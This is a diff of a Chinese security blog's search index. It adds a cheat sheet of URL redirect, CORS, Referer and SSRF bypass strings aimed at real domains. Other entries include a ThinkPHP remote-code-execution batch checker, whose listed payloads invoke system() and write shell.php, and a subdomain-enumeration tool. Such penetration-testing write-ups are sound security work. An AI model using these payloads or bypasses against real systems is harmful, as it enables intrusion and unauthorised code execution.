@@ -1,6 +1,23 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[URL相关Bypass总结]]></title>
+    <url>%2Fredict-bypass.html</url>
+    <content type="text"><![CDATA[任意URL跳转绕过常规绕过方式： 12345678&lt;!--以下绕过方法均跳转到admintony.com--&gt;http://admintony.com?jd.comhttp://admintony.com#jd.comhttp://admintony.com/jd.comhttp://admintony.com\jd.comhttp://admintony.com\\jd.comhttp://jd.com@admintony.comhttp://jd.com.admintony.com HPP参数污染绕过： 123http://sso.jd.com/?redir=http://jd.com&amp;redir=a@admintony.com那么跳转会变成：Location:http://jd.com,@admintony.com 畸形绕过： 昨晚遇到一个情况，当redir的参数为：http://localhost?.dianping.com时，正常跳转到localhost，当参数为：http://localhost.?.dianping.com时依然正常跳转，但是在localhost的.后面加上任意数字或字母，马上就跳转到m.dianping.com了，因此使用数字地址进行任意URL跳转。 数字地址计算方式1 可以是十六进制，八进制等。115.239.210.26 &gt;&gt;&gt; 16373751032首先把这四段数字给分别转成16进制，结果：73 ef d2 1a然后把 73efd21a 这十六进制一起转换成8进制记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x。 访问：http://016373751032 ,即可访问到百度。 数字地址计算方式2 111.13.100.92 转成数字地址的方式为：111256256256 + 13256256+100256+92*1这样得到：1863148636 这种数字地址不需要在前面加0，即访问：http://1863148636 即可访问到百度。 跨域资源访问绕过由于Origin中不存在带path情况，所以跨域资源访问绕过方式只有以下几点： 123http://www.jd.com.admintony.comhttp://hhjd.comhttp://m.jd.com-.admintony.com #适用于匹配jd.com后面是数字、字符、"."的情况。 CSRF的refer绕过从域名下手1234http://admintony.com/?jd.comhttp://admintony.com/#jd.comhttp://admintony.com/jd.com/http://jd.com.admintony.com 其他方式 refer为空 利用ftp://,file://,javascript:,data:协议，当浏览器地址栏是这些协议开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。 img标签的src属性 如果该站点的子域名内，存在发帖，img的src属性可控的情况，也可以使用&lt;img src=&#39;CSRF地址&#39;&gt;来绕过。 站内URL跳转 有很多时候，URL跳转可以跳转到其任意子域名，可以利用URL跳转的方式来绕过refer。 SSRF绕过方式我觉得这个已经有总结的很详细的了，传送门SSRF绕过方法总结]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>逻辑漏洞</category>
+        <category>URL相关Bypass总结</category>
+      </categories>
+      <tags>
+        <tag>URL相关Bypass总结</tag>
+        <tag>URL跳转</tag>
+        <tag>CORS绕过</tag>
+        <tag>Refer绕过</tag>
+        <tag>SSRF绕过</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[打击盗版，支持原创 | 暨COSIntelligentUpload更新通知]]></title>
     <url>%2Fcopyright.html</url>
     <content type="text"><![CDATA[打击盗版，支持原创可耻的现象对于一个博主，我本着分享的理念，将学习、工作过程中的一些思路或者技巧分享出来，但有些可恶的人，转载了笔者的文章，不加出处也就罢了，还将文中我所推广的原创工具删掉或更改为其他工具，之后在标题中加上“原创”二字，这个行为让笔者觉得很难适应。我相信每一个博主都不希望自己所作的作品被这样的抄袭。 遂想办法来维权，首先想到图片上加上Logo进行维权，但由于笔者博客使用markdown编写的，图片均存储于腾讯云的COS中，若每个图自己加logo再传入腾讯云的COS，太过繁琐、费时费力，因此更新COSIntelligentUpload，请移步后面观看。其次想到请每一位转载者遵循转载协议，下一节提及。 转载协议作为一个分享者，我也希望博文能够被更多的人看到，所以，如果博客中的某一篇文章对你影响很深或者你很喜欢，那么你可以转载，并且不需要询问我，只需要把文末的转载协议加上或者在文末写上一句转自哪里哪里就行了。本博客自2019.01.12起，不欢迎无耻的抄袭，请自重。 COSIntelligentUpload更新通知v2.1 Beat1.优化配置文件读取，允许在配置文件中增加注释，如： 123456789101112app_id = 1252108140secret_id = AK******secret_key = Vu*******region = bj# 是否启用水印 , no表示不启用 , yes表示启用watermark = yes# 水印类型 , 0表示图片水印 , 1表示文字水印watermark_method = 0# 图片水印地址watermark_path = watermark.jpg# 文字水印内容watermark_content = http://www.admintony.com 2.添加水印 2.1 图片水印 若要使用图片水印，则必须要在配置文件中设置以下内容： 123456# 是否启用水印 , no表示不启用 , yes表示启用watermark = yes# 水印类型 , 0表示图片水印 , 1表示文字水印watermark_method = 0# 图片水印地址 ：建议 200x200像素的watermark_path = watermark.png 效果如下图所示 2.2 文字水印 若需要使用文字水印，则必须要在配置文件中设置以下内容： 123456# 是否启用水印 , no表示不启用 , yes表示启用watermark = yes# 水印类型 , 0表示图片水印 , 1表示文字水印watermark_method = 1# 文字水印内容watermark_content = http://www.admintony.com 效果如下： 下载地址COSIntelligentUpload 参考第1.1题：Python图片添加水印 感谢大家支持最后感谢所有访问过该博客的朋友的支持，预祝你们新春快乐，在2019年技术突飞猛进。]]></content>
@@ -47,8 +64,8 @@
     <url>%2FthinkPHPBatchPoc.html</url>
     <content type="text"><![CDATA[123456789PS E:\vulW3b&gt; python .\thinkPHPBatchPoc.pythinkPHPBatchPocAuthor: Admintony @ 2018.12.13Blog: http://www.admintony.com免责声明: 脚本仅用于批量检测站点是否存在漏洞，请勿用于非法用途，否则作者不担负任何责任。usage:thinkPHPBatchPoc.py -f target.txt # 批量检测是否存在thinkPHP代码执行漏洞thinkPHPBatchPoc.py -u target_URL # 指定检测是否存在thinkPHP代码执行漏洞 thinkPHPBatchPocthinkPHPBatchPoc 是thinkPHP代码执行批量检测工具 工具所使用的payload123456789?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20www_admintony_com?s=index/\think\Request/input&amp;filter=system&amp;data=echo%20www_admintony_com?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20echo%20www_admintony_com;?%3E?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20www_admintony_com?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20echo%20"www_admintony_com";?%3E 工具使用方法123456789PS E:\PyProject&gt; python .\thinkPHPBatchPoc.pythinkPHPBatchPocAuthor: Admintony @ 2018.12.13Blog: http://www.admintony.com免责声明: 脚本仅用于批量检测站点是否存在漏洞，请勿用于非法用途，否则作者不担负任何责任。usage:thinkPHPBatchPoc.py -f target.txt # 批量检测是否存在thinkPHP代码执行漏洞thinkPHPBatchPoc.py -u target_URL # 指定检测是否存在thinkPHP代码执行漏洞 针对单个目标进行测试123PS E:\PyProject&gt; python .\thinkPHPBatchPoc.py -u admintony.com[+] http://admintony.com is vulnerable[+] Payload is ?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20www_admintony_com 批量测试12345678910PS E:\PyProject&gt; python .\thinkPHPBatchPoc.py -f .\target.txt[+]Testing http://www.admintony.com[-] http://www.admintony.com is not vulnerable[+]Testing http://baidu.com[-] http://baidu.com is not vulnerable[+]Testing vulW3b.admintony.com/[+] http://vulW3b.admintony.com/ is vulnerable[+] Payload is ?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20www_admintony_com 下载地址thinkPHPBatchPoc]]></content>
       <tags>
-        <tag>thinkPHP</tag>
         <tag>代码执行</tag>
+        <tag>thinkPHP</tag>
       </tags>
   </entry>
   <entry>
@@ -433,8 +450,8 @@
     <url>%2F%E5%AD%90%E5%9F%9F%E5%90%8D%E5%8F%91%E7%8E%B0%E5%B7%A5%E5%85%B7.html</url>
     <content type="text"><![CDATA[子域名在渗透中起着很重要的作用，子域名挖掘工具很多，比如Seay法师写的那款暴力枚举的子域名挖掘工具。但是在挖掘过程中，我发现Seay写的那款，对于那些收录较高的站点，挖掘效率很低，甚至还会卡死。因此自己写了一款基于百度搜索语法的子域名挖掘工具，适用于收录高的站点。 V1.0版本用法e.g.main.py --domain=ParentDomain -p PageNum [--thread=5] # --domain 填写父域名如：admintony.top # -p 填写要爬行的页数，页数过大会重新重新爬第一页，所以建议百度搜索inurl:domain后再填写页数 # --thread 参数可选，默认为5 展示 代码地址：Digger V2.0版本更新说明在这段时间的使用过程中，发现了V1.0版本一些设计不够友好，还需要一些人力来辅助，所以进行了算法优化更新，这次都更新了什么： 1.优化算法，不再需要用户输入page_num，而是对页面中“下一页”识别判断是否为最后一页。 2.支持存活检测，–status 选项，支持用户自定义存活状态码，默认为all即不进行存活检测 新的用法介绍新版本的用法也有些不同了，下面是新版本的用法介绍： python diiger2.0.py --domain=swust.edu.cn [--status=200,404,403,401] [--thread=10] 12345Options: -h, --help show this help message and exit --domain=DOMAIN 父域名！[必须参数] --thread=THREAD_NUM 线程数！[可选，默认为5] --status=STATUS 存活检测状态码，默认不进行存活检测！输入状态码以&quot;,&quot;隔开[可选，默认不进行存活检测] 展示 代码地址Digger]]></content>
       <tags>
-        <tag>原创工具</tag>
         <tag>digger-子域名发现工具</tag>
+        <tag>原创工具</tag>
       </tags>
   </entry>
   <entry>
